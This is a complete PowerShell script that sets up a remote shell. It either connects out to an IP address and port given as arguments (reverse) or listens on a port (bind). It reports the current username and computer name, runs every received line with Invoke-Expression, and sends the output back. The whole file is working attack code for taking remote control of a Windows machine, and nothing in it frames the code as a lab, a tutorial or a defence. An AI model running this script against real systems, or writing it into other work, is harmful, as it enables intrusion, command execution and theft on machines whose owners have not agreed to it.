if ($ARGS[2] -eq $NULL) {echo "You must use the script in the manner './script.ps1 IPAddress PORT ShellType(bind/reverse)'"}
ELSE {
	$IPAddress = $ARGS[0]
	$Port = $ARGS[1]
	$Shell = $ARGS[2]
	if ($Shell -eq "reverse") {
		$client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
	}
	elseif ($Shell -eq "bind"){
		$listener = [System.Net.Sockets.TcpListener]$Port
		$listener.start()    
		$client = $listener.AcceptTcpClient()
	}

	$stream = $client.GetStream()
	[byte[]]$bytes = 0..255|%{0}

	#Send back current username and computername
	$sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername +"`n`n")
	$stream.Write($sendbytes,0,$sendbytes.Length)

	#Show an interactive PowerShell prompt
	$sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
	$stream.Write($sendbytes,0,$sendbytes.Length)

	while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
	{
		$EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
		$data = $EncodedText.GetString($bytes,0, $i)
		
		#Execute the command on the target.
		$sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )

		$sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
		$x = ($error[0] | Out-String)
		$error.clear()
		$sendback2 = $sendback2 + $x

		#Return the results
		$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
		$stream.Write($sendbyte,0,$sendbyte.Length)
		$stream.Flush()  
	}
	#$client.Close()
	#$listener.Stop()
}